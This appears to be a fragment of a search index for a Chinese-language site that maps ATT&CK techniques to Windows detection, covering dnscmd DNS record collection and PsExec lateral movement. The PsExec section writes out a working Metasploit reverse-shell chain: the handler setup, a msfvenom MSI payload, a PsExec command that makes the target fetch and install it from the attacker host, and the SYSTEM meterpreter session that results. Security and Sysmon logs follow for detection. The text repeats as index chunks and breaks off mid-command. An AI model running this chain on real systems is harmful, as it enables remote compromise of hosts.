\u4e3a\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u8bbe\u7f6e\u6d3b\u52a8\u548c/\u6216\u5f85\u673a\u5bc6\u94a5 /ZoneGetSKDState -- \u68c0\u7d22\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u7684\u52a8\u6001\u72b6\u6001 /ZonePerformKeyRollover -- \u5728\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u4e2d\u89e6\u53d1\u5bc6\u94a5\u6eda\u52a8\u66f4\u65b0 /ZonePokeKeyRollover -- \u5728\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u4e2d\u89e6\u53d1\u5bc6\u94a5\u6eda\u52a8\u66f4\u65b0 /ZoneSign -- \u4f7f\u7528 DNSSEC \u8054\u673a\u7b7e\u540d\u53c2\u6570\u4e3a\u533a\u57df\u7b7e\u540d /ZoneUnsign -- \u4ece\u5df2\u7b7e\u540d\u7684\u533a\u57df\u4e2d\u5220\u9664 DNSSEC \u7b7e\u540d /ZoneResign -- \u5728\u5df2\u7b7e\u540d\u7684\u533a\u57df\u4e2d\u91cd\u65b0\u751f\u6210 DNSSEC \u7b7e\u540d /EnumRecords -- \u679a\u4e3e\u540c\u4e00\u540d\u79f0\u7684\u8bb0\u5f55 /RecordAdd -- \u5728\u533a\u57df\u6216\u6839\u63d0\u793a\u4e2d\u521b\u5efa\u8bb0\u5f55 /RecordDelete -- \u4ece\u533a\u57df\u3001\u6839\u63d0\u793a\u6216\u7f13\u5b58\u4e2d\u5220\u9664\u8bb0\u5f55 /NodeDelete -- \u5220\u9664\u540c\u4e00\u540d\u79f0\u7684\u6240\u6709\u8bb0\u5f55 /AgeAllRecords -- \u5bf9\u533a\u57df\u4e2d\u7684\u8282\u70b9\u8fdb\u884c\u5f3a\u5236\u8001\u5316 /TrustAnchorAdd -- \u5728 DNS \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u65b0\u7684\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df /TrustAnchorDelete -- \u4ece DNS \u670d\u52a1\u5668\u6216 DS \u5220\u9664\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df /EnumTrustAnchors -- \u663e\u793a\u4fe1\u4efb\u5b9a\u4f4d\u70b9\u7684\u72b6\u6001\u4fe1\u606f /TrustAnchorsResetType -- \u66f4\u6539\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df\u7684\u533a\u57df\u7c7b\u578b /EnumDirectoryPartitions -- \u679a\u4e3e\u76ee\u5f55\u5206\u533a /DirectoryPartitionInfo -- \u83b7\u53d6\u6709\u5173\u76ee\u5f55\u5206\u533a\u7684\u4fe1\u606f /CreateDirectoryPartition -- \u521b\u5efa\u76ee\u5f55\u5206\u533a /DeleteDirectoryPartition -- \u5220\u9664\u76ee\u5f55\u5206\u533a /EnlistDirectoryPartition -- \u5c06 DNS \u670d\u52a1\u5668\u6dfb\u52a0\u5230\u5206\u533a\u590d\u5236\u4f5c\u7528\u57df /UnenlistDirectoryPartition -- \u4ece\u590d\u5236\u4f5c\u7528\u57df\u4e2d\u5220\u9664 DNS \u670d\u52a1\u5668 /CreateBuiltinDirectoryPartitions -- \u521b\u5efa\u5185\u7f6e\u5206\u533a /ExportSettings -- \u5c06\u8bbe\u7f6e\u8f93\u51fa\u5230 DNS \u670d\u52a1\u5668\u6570\u636e\u5e93\u76ee\u5f55\u4e2d\u7684 DnsSettings.txt /OfflineSign -- \u8131\u673a\u7b7e\u540d\u533a\u57df\u6587\u4ef6\uff0c\u5305\u62ec\u5bc6\u94a5\u751f\u6210/\u5220\u9664 /EnumTrustPoints -- \u663e\u793a\u6240\u6709\u4fe1\u4efb\u70b9\u7684\u6709\u6548\u5237\u65b0\u4fe1\u606f /ActiveRefreshAllTrustPoints -- \u7acb\u5373\u5bf9\u6240\u6709\u4fe1\u4efb\u70b9\u6267\u884c\u6709\u6548\u5237\u65b0 /RetrieveRootTrustAnchors -- \u901a\u8fc7 HTTPS \u68c0\u7d22\u6839\u4fe1\u4efb\u5b9a\u4f4d\u70b9 <Command Parameters>: DnsCmd <CommandName> /? -- \u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f \u5728\u5c06\u6765\u7684 Windows \u7248\u672c\u4e2d\uff0cMicrosoft \u53ef\u80fd\u4f1a\u5220\u9664 dnscmd.exe\u3002 \u5982\u679c\u4f60\u5f53\u524d\u4f7f\u7528 dnscmd.exe \u914d\u7f6e\u548c\u7ba1\u7406 DNS \u670d\u52a1\u5668\uff0c Microsoft \u5efa\u8bae\u4f60\u8fc7\u6e21\u5230 Windows PowerShell\u3002 \u82e5\u8981\u67e5\u770b DNS \u670d\u52a1\u5668\u7ba1\u7406\u547d\u4ee4\u5217\u8868\uff0c\u8bf7\u5728 Windows PowerShell \u63d0\u793a\u7b26\u5904\u952e\u5165 \"Get-Command -Module DnsServer\"\u3002 \u6709\u5173\u9002\u7528\u4e8e DNS \u7684 Windows PowerShell \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 http://go.microsoft.com/fwlink/?LinkId=217627\u3002","title":"\u5e38\u7528\u547d\u4ee4"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_5","text":"\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x111c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\dnscmd.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xb40 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: dnscmd /ZoneInfo 361a.com","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_7","text":"\u6700\u7b80\u5355\u7684\u529e\u6cd5\u5c31\u662f\u68c0\u6d4b\u76f8\u5173\u547d\u4ee4\u884c\u53ca\u8fdb\u7a0b\uff0c\u4f46\u8fd9\u4f3c\u4e4e\u4e0d\u662f\u5f88\u9760\u8c31\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_8","text":"MITRE-ATT&CK-T1590 https://attack.mitre.org/techniques/T1590/ \u57df\u6e17\u900f\u2014\u2014DNS\u8bb0\u5f55\u7684\u83b7\u53d6 https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/","text":"T1021-002-win-\u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u5668\u5e10\u6237\u963b\u6b62\uff08SMB\uff09\u4f7f\u7528\u6709\u6548\u5e10\u6237\u4e0e\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002 SMB\u662f\u540c\u4e00\u7f51\u7edc\u6216\u57df\u4e0aWindows\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u6253\u5370\u673a\u548c\u4e32\u884c\u7aef\u53e3\u5171\u4eab\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528SMB\u4e0e\u6587\u4ef6\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u5141\u8bb8\u4ed6\u4eec\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u6a2a\u5411\u79fb\u52a8\u3002SMB\u7684Linux\u548cmacOS\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528Samba\u3002 Windows\u7cfb\u7edf\u5177\u6709\u9690\u85cf\u7684\u7f51\u7edc\u5171\u4eab\uff0c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u63d0\u4f9b\u4e86\u8fdc\u7a0b\u6587\u4ef6\u590d\u5236\u548c\u5176\u4ed6\u7ba1\u7406\u529f\u80fd\u3002\u4f8b\u5982\u7f51\u7edc\u5171\u4eab\u5305\u62ecC$\uff0cADMIN$\uff0c\u548cIPC$\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6b64\u6280\u672f\u4e0e\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6709\u6548\u5e10\u6237\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u901a\u8fc7SMB\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u7cfb\u7edf\uff1b\u4f7f\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u4e0e\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff1b\u4f20\u8f93\u6587\u4ef6\uff1b\u4ee5\u53ca\u901a\u8fc7\u8fdc\u7a0b\u6267\u884c\u6765\u8fd0\u884c\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4f9d\u8d56\u4e8eSMB/RPC\u4e0a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u7684\u793a\u4f8b\u6267\u884c\u6280\u672f\u4e3a\u8ba1\u5212\u4efb\u52a1/\u4f5c\u4e1a\uff0c\u670d\u52a1\u6267\u884c\u548cWindows\u7ba1\u7406\u89c4\u8303\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528NTLM\u54c8\u5e0c\u8bbf\u95ee\u5177\u6709\u6563\u5217\uff0c\u7279\u5b9a\u914d\u7f6e\u548c\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u7684\u7cfb\u7edf\u4e0a\u7684\u7ba1\u7406\u5458\u5171\u4eab\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5fae\u8f6f\u4e8e2006\u5e747\u6708\u6536\u8d2dsysinternals\u516c\u53f8\uff0cPsExec\u662fSysinternalsSuite\u7684\u5c0f\u5de5\u5177\u4e4b\u4e00\uff0c\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684telnet\u66ff\u4ee3\u54c1\uff0c\u5141\u8bb8\u5728\u5176\u4ed6\u7cfb\u7edf\u4e0a\u6267\u884c\u8fdb\u7a0b\uff0c\u5b8c\u6210\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u7684\u5b8c\u5168\u4ea4\u4e92\uff0c\u800c\u65e0\u9700\u624b\u52a8\u5b89\u88c5\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u5e76\u4e14\u53ef\u4ee5\u83b7\u5f97\u4e0e\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u76f8\u5f53\u7684\u5b8c\u5168\u4ea4\u4e92\u6027\u3002 \u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec \u8bf4\u660e\uff1aPsExec.exe\u6ca1\u6709\u9ed8\u8ba4\u5b89\u88c5\u5728windows\u7cfb\u7edf\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09 \u653b\u51fb\u5206\u6790 \u914d\u7f6eMSF msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > exploit \u751f\u6210payload msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > shellcode.msi \u9776\u673a\u6267\u884c \u6ce8\u610f\uff1a\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2020-04-18 23:09:44 +0800 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > getpid Current pid: 2352 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 EventID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xe84 \u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\PSTools\\PsExec.exe EventID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xfcc \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\PSEXESVC.exe EVentID\uff1a5140 \u7f51\u7edc\u4fe1\u606f: \u5bf9\u8c61\u7c7b\u578b: File \u6e90\u5730\u5740: fe80::719e:d312:648f:4884 \u6e90\u7aef\u53e3: 49369 \u5171\u4eab\u4fe1\u606f: \u5171\u4eab\u540d: \\\\*\\IPC$ EventID\uff1a5145 \u7f51\u7edc\u4fe1\u606f: \u5bf9\u8c61\u7c7b\u578b: File \u6e90\u5730\u5740: fe80::719e:d312:648f:4884 \u6e90\u7aef\u53e3: 49369 \u5171\u4eab\u4fe1\u606f: \u5171\u4eab\u540d\u79f0: \\\\*\\IPC$ \u5171\u4eab\u8def\u5f84: \u76f8\u5bf9\u76ee\u6807\u540d\u79f0: PSEXESVC SYSMON\u65e5\u5fd7 EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 15:09:29.237 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001} ProcessId: 3716 Image: C:\\Users\\12306Br0\\Desktop\\PSTools\\PsExec.exe FileVersion: 2.2 Description: Execute processes remotely Product: Sysinternals PsExec Company: Sysinternals - www.sysinternals.com OriginalFileName: psexec.c CommandLine: PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi CurrentDirectory: C:\\Users\\12306Br0\\Desktop\\PSTools\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600} LogonId: 0x6e1ea TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=E50D9E3BD91908E13A26B3E23EDEAF577FB3A095 ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001} ParentProcessId: 3492 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 15:09:29.284 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001} ProcessId: 4044 Image: C:\\Windows\\PSEXESVC.exe FileVersion: 2.2 Description: PsExec Service Product: Sysinternals PsExec Company: Sysinternals OriginalFileName: psexesvc.exe CommandLine: C:\\Windows\\PSEXESVC.exe CurrentDirectory: C:\\Windows\\system32\\ User: NT AUTHORITY\\SYSTEM LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000} LogonId: 0x3e7 TerminalSessionId: 0 IntegrityLevel: System Hashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7 ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000} ParentProcessId: 496 ParentImage: C:\\Windows\\System32\\services.exe ParentCommandLine: C:\\Windows\\system32\\services.exe EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 15:09:29.440 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001} ProcessId: 1916 Image: C:\\Windows\\System32\\msiexec.exe FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows\u00ae installer Product: Windows Installer - Unicode Company: Microsoft Corporation OriginalFileName: msiexec.exe CommandLine: \"msiexec.exe\" /q /i http://192.168.126.146/shellcode.msi CurrentDirectory: C:\\Windows\\system32\\ User: NT AUTHORITY\\SYSTEM LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000} LogonId: 0x3e7 TerminalSessionId: 0 IntegrityLevel: System Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001} ParentProcessId: 4044 ParentImage: C:\\Windows\\PSEXESVC.exe ParentCommandLine: C:\\Windows\\PSEXESVC.exe \u7531\u4e8esysmon\u914d\u7f6e\u95ee\u9898\uff0c\u53ea\u5bf9\u8fdb\u7a0b\u521b\u5efa\u884c\u4e3a\u8fdb\u884c\u76d1\u63a7 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636ePsExec\u7279\u5f81\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1021-002 https://attack.mitre.org/techniques/T1021/002/ \u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload https://blog.csdn.net/ws13129/article/details/89879771","title":"T1021-002-win-\u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#t1021-002-win-psexecpayload","text":"","title":"T1021-002-win-\u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u5668\u5e10\u6237\u963b\u6b62\uff08SMB\uff09\u4f7f\u7528\u6709\u6548\u5e10\u6237\u4e0e\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002 SMB\u662f\u540c\u4e00\u7f51\u7edc\u6216\u57df\u4e0aWindows\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u6253\u5370\u673a\u548c\u4e32\u884c\u7aef\u53e3\u5171\u4eab\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528SMB\u4e0e\u6587\u4ef6\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u5141\u8bb8\u4ed6\u4eec\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u6a2a\u5411\u79fb\u52a8\u3002SMB\u7684Linux\u548cmacOS\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528Samba\u3002 Windows\u7cfb\u7edf\u5177\u6709\u9690\u85cf\u7684\u7f51\u7edc\u5171\u4eab\uff0c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u63d0\u4f9b\u4e86\u8fdc\u7a0b\u6587\u4ef6\u590d\u5236\u548c\u5176\u4ed6\u7ba1\u7406\u529f\u80fd\u3002\u4f8b\u5982\u7f51\u7edc\u5171\u4eab\u5305\u62ecC$\uff0cADMIN$\uff0c\u548cIPC$\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6b64\u6280\u672f\u4e0e\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6709\u6548\u5e10\u6237\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u901a\u8fc7SMB\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u7cfb\u7edf\uff1b\u4f7f\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u4e0e\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff1b\u4f20\u8f93\u6587\u4ef6\uff1b\u4ee5\u53ca\u901a\u8fc7\u8fdc\u7a0b\u6267\u884c\u6765\u8fd0\u884c\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4f9d\u8d56\u4e8eSMB/RPC\u4e0a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u7684\u793a\u4f8b\u6267\u884c\u6280\u672f\u4e3a\u8ba1\u5212\u4efb\u52a1/\u4f5c\u4e1a\uff0c\u670d\u52a1\u6267\u884c\u548cWindows\u7ba1\u7406\u89c4\u8303\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528NTLM\u54c8\u5e0c\u8bbf\u95ee\u5177\u6709\u6563\u5217\uff0c\u7279\u5b9a\u914d\u7f6e\u548c\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u7684\u7cfb\u7edf\u4e0a\u7684\u7ba1\u7406\u5458\u5171\u4eab\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_1","text":"\u5fae\u8f6f\u4e8e2006\u5e747\u6708\u6536\u8d2dsysinternals\u516c\u53f8\uff0cPsExec\u662fSysinternalsSuite\u7684\u5c0f\u5de5\u5177\u4e4b\u4e00\uff0c\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684telnet\u66ff\u4ee3\u54c1\uff0c\u5141\u8bb8\u5728\u5176\u4ed6\u7cfb\u7edf\u4e0a\u6267\u884c\u8fdb\u7a0b\uff0c\u5b8c\u6210\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u7684\u5b8c\u5168\u4ea4\u4e92\uff0c\u800c\u65e0\u9700\u624b\u52a8\u5b89\u88c5\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u5e76\u4e14\u53ef\u4ee5\u83b7\u5f97\u4e0e\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u76f8\u5f53\u7684\u5b8c\u5168\u4ea4\u4e92\u6027\u3002 \u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec \u8bf4\u660e\uff1aPsExec.exe\u6ca1\u6709\u9ed8\u8ba4\u5b89\u88c5\u5728windows\u7cfb\u7edf\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09","title":"\u73af\u5883\u51c6\u5907"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > exploit","title":"\u914d\u7f6eMSF"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#payload","text":"msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > 